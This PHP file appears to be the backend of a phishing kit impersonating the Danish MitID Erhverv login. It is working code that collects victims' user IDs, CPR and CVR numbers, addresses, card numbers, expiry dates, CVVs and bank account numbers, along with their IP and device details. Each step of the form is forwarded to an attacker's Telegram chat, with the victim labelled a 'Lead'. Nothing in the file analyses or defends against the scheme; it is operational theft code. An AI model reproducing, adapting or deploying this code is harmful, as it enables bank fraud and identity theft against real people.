<?php
/**
 * ajax/send.php
 * Receives form data via AJAX step by step.
 * Sends/updates a SINGLE Telegram message per session.
 * Only message_id stored in $_SESSION — no user data on disk.
 * Cross-out: ❌ <s>OLD</s> on changed fields.
 */
error_reporting(0);
require_once __DIR__ . '/../include/config.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method not allowed');
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    http_response_code(400);
    exit('Invalid JSON');
}

// Merge with previous session data (keep all fields across steps)
if (isset($_SESSION['prev_data']) && is_array($_SESSION['prev_data'])) {
    foreach ($_SESSION['prev_data'] as $k => $v) {
        if (empty($input[$k]) && !empty($v)) $input[$k] = $v;
    }
}

// Build the message & signature
$msg  = buildMessage($input);
$sig  = md5($msg);

// If nothing changed since last sync, skip
if (isset($_SESSION['last_signature']) && $_SESSION['last_signature'] === $sig) {
    header('Content-Type: application/json');
    echo json_encode(['ok' => true, 'skipped' => true, 'message_id' => $_SESSION['tg_message_id'] ?? null]);
    exit;
}
$_SESSION['last_signature'] = $sig;

// Push to Telegram (edit if we have a message_id, otherwise create)
if (!empty($_SESSION['tg_message_id'])) {
    $result = tg_edit($_SESSION['tg_message_id'], $msg);
    if (!$result) {
        unset($_SESSION['tg_message_id']);
    }
}

if (empty($_SESSION['tg_message_id'])) {
    $result = tg_send($msg);
    if ($result && isset($result['ok']) && $result['ok'] && isset($result['result']['message_id'])) {
        $_SESSION['tg_message_id'] = $result['result']['message_id'];
    }
}

// Store current data in session for next merge
$_SESSION['prev_data'] = $input;

header('Content-Type: application/json');
echo json_encode(['ok' => true, 'message_id' => $_SESSION['tg_message_id'] ?? null]);

// ─── FUNCTIONS ──────────────────────────────────────────

function buildMessage($data) {
    $prev = $_SESSION['prev_data'] ?? [];

    $date = date('d.m.Y');   // 24.08.2026
    $ip   = getUserIP();
    $ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $line = "━━━━━━━━━━━━━━━━━━━━\n";

    $msg  = "MitID Erhverv Lead - {$date}\n";
    $msg .= $line;

    $msg .= "🔐 Login Detaljer:\n";
    $msg .= f(' 📜 Bruger ID', $data['brugerID'] ?? '', $prev['brugerID'] ?? '');
    $msg .= f(' 🆔 CPR', $data['cprNumber'] ?? '', $prev['cprNumber'] ?? '');
    $msg .= $line;

    $msg .= "👤 Personlige Oplysninger:\n";
    $msg .= f(' 🏢 CVR-Nummer', $data['cvrNumber'] ?? '', $prev['cvrNumber'] ?? '');
    $msg .= f(' ☎️ Telefon', !empty($data['phoneNumber']) ? '+45 ' . $data['phoneNumber'] : '', !empty($prev['phoneNumber']) ? '+45 ' . $prev['phoneNumber'] : '');
    $msg .= f(' 👤 Fulde Navn', $data['navn'] ?? '', $prev['navn'] ?? '');
    $msg .= f(' 🏠 Adresse', $data['address'] ?? '', $prev['address'] ?? '');
    $msg .= f(' 📮 Postnummer', $data['postnummer'] ?? '', $prev['postnummer'] ?? '');
    $msg .= f(' 🏙 By', $data['by'] ?? '', $prev['by'] ?? '');
    $msg .= f(' 🏦 Bank', $data['selectedBank'] ?? '', $prev['selectedBank'] ?? '');
    $msg .= $line;

    $msg .= "💳 Kort & Konto Detaljer:\n";
    $msg .= f(' 💳 Kort Ejernavn', $data['kortnavn'] ?? '', $prev['kortnavn'] ?? '');
    $msg .= f(' 💳 Kort Nummer', $data['kortnummer'] ?? '', $prev['kortnummer'] ?? '');
    $msg .= f(' 📅 Udløbsdato', $data['expiry'] ?? '', $prev['expiry'] ?? '');
    $msg .= f(' 🔒 CVV', $data['cvv'] ?? '', $prev['cvv'] ?? '');
    $msg .= f(' 🔢 Regnr', $data['regNr'] ?? '', $prev['regNr'] ?? '');
    $msg .= f(' 🔢 Kontonr', $data['kontoNr'] ?? '', $prev['kontoNr'] ?? '');
    $msg .= $line;

    $msg .= "🌐 Enhed & Netværk Info:\n";
    $msg .= " 📍 IP Adresse: <code>" . htmlspecialchars((string)$ip, ENT_QUOTES, 'UTF-8') . "</code>\n";
    $msg .= " 🌍 Land: <code>N/A</code>\n";
    $msg .= " 💻 Enhed: <code>" . htmlspecialchars((string)$ua, ENT_QUOTES, 'UTF-8') . "</code>\n";
    $msg .= $line;

    return $msg;
}

/**
 * Format one field line for Telegram HTML.
 * Every value is escaped and wrapped in <code> (the `value` marker).
 * If the value changed since last submit: show ❌ <s>OLD</s> then the new value,
 * so the single session message reads as a live-updating log.
 */
function f($label, $new, $old) {
    $new = $new ?: '—';
    $new = htmlspecialchars($new, ENT_QUOTES, 'UTF-8');
    $old = htmlspecialchars((string)$old, ENT_QUOTES, 'UTF-8');

    if ($old && $old !== '—' && $old !== $new) {
        return "{$label}: ❌ <s>{$old}</s>\n{$label}: <code>{$new}</code>\n";
    }
    return "{$label}: <code>{$new}</code>\n";
}

function tg_send($text) {
    return tg_request(TELEGRAM_API . '/sendMessage', [
        'chat_id'    => CHAT_ID,
        'text'       => $text,
        'parse_mode' => 'HTML'
    ]);
}

function tg_edit($messageId, $text) {
    $r = tg_request(TELEGRAM_API . '/editMessageText', [
        'chat_id'    => CHAT_ID,
        'message_id' => $messageId,
        'text'       => $text,
        'parse_mode' => 'HTML'
    ]);
    return $r && isset($r['ok']) && $r['ok'];
}

function tg_request($url, $data) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result   = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($httpCode === 200) ? json_decode($result, true) : null;
}
?>
